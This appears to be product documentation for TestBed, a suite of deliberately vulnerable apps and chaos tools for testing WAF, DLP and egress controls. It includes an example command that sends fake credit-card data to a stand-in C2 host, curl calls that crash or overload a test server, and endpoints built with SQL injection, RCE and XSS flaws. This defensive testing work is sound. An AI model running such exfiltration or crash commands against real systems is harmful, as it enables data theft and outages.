# Feature: TestBed

TestBed is a suite of intentionally vulnerable applications and chaos tools designed for validating your WAF configuration, testing DLP policies, and exercising resilience scenarios. It provides realistic attack surfaces so you can verify that Synapse sensors detect and block threats correctly -- without exposing production systems.

## What TestBed Includes

TestBed bundles several purpose-built components, each targeting a different aspect of security validation:

| Component | Purpose |
|-----------|---------|
| **Quarterdeck** | Central command dashboard for managing all TestBed operations |
| **The Victim** | Deliberately vulnerable web application with OWASP Top 10 flaws |
| **Riptide** | Egress validation tool for testing outbound data exfiltration controls |
| **Siren** | Cloud metadata impersonator for trapping SSRF and cloud-native attacks |
| **Squall** | Chaos proxy for injecting faults between services |
| **Neural** | LLM-powered interactive deception shell (honeypot) |

## Quarterdeck (Command Center)

Quarterdeck is TestBed's central dashboard, accessible at `/dashboard`. It provides real-time traffic inspection, vulnerability scan launching, background traffic control, virtual patch management, AI prompt testing, and browser-based egress scanning.

## The Victim (Vulnerable Application)

A web application deliberately engineered with OWASP Top 10 vulnerabilities. Deploy it behind a Synapse sensor to verify WAF detection rules.

| Endpoint | Vulnerability |
|----------|--------------|
| `GET /victim/login` | SQL Injection |
| `GET /victim/calc` | Remote Code Execution |
| `GET /victim/guestbook` | Reflected XSS |

TestBed also includes a DLP simulation endpoint (`/dlp?type=cc`) that generates fake sensitive data (credit cards, SSNs, API keys) in responses for validating DLP scanning and redaction.

## Riptide (Egress Validator)

Riptide tests whether a compromised container can communicate with the outside world. Run it inside your environment to validate that egress controls are properly configured.

```bash
# Basic connectivity check (DNS, HTTP to public sites)
npm run escape

# Test exfiltration with fake sensitive data
npm run escape -- --target http://test-c2.example.com --dlp cc

# Test specific egress ports
npm run escape -- --ports 22,25,443,1883,8080
```

Riptide helps answer critical questions: Can a compromised workload phone home? Can it exfiltrate data over unexpected ports? Are your network policies actually enforced?

## Siren (Cloud Metadata Impersonator)

Siren emulates cloud metadata services (AWS IMDS, GCP Metadata) locally, serving fake monitored credentials to detect SSRF attacks and unauthorized metadata access.

```bash
npm run imposter
export AWS_EC2_METADATA_SERVICE_ENDPOINT=http://localhost:16925
```

## Squall (Chaos Proxy)

Squall sits between your frontend and backend, injecting controlled faults via the `X-Toxic-Mode` header: `latency` (500-2500ms delays), `error_500`, `slow_drip` (byte-at-a-time streaming), and `corrupt_body` (random bit flips). Use it to validate that Synapse handles upstream failures gracefully.

```bash
export TARGET_URL=http://localhost:8080
npm run sidecar
```

## Chaos Endpoints

TestBed includes dedicated chaos endpoints for resilience testing:

```bash
# Trigger a CPU spike (duration in milliseconds)
curl http://testbed:8080/chaos/cpu?duration=5000

# Simulate a memory leak
curl http://testbed:8080/chaos/memory

# Trigger an application crash
curl http://testbed:8080/chaos/crash
```

These endpoints let you observe how Synapse and Signal Horizon respond to backend instability -- verifying that health monitoring, alerting, and failover mechanisms work as expected.

## Using TestBed for WAF Validation

A typical WAF validation workflow with TestBed:

1. **Deploy TestBed** behind a Synapse sensor (Docker or Kubernetes).
2. **Run attack scenarios** against The Victim endpoints to verify detection rules.
3. **Check DLP** by requesting endpoints that return fake sensitive data.
4. **Test egress controls** with Riptide from inside the container.
5. **Inject faults** with Squall to verify resilience under degraded conditions.
6. **Review results** in Signal Horizon to confirm all detections were reported correctly.

### Deployment

```bash
# Docker
docker build -t apparatus:latest .
docker run -p 8080:8080 -p 8443:8443 apparatus:latest

# Kubernetes (Helm)
helm install apparatus ./helm/ts-echo-pro
```

**Important**: TestBed contains intentional security vulnerabilities. Never expose it to the public internet or untrusted networks. It is designed exclusively for controlled testing environments.
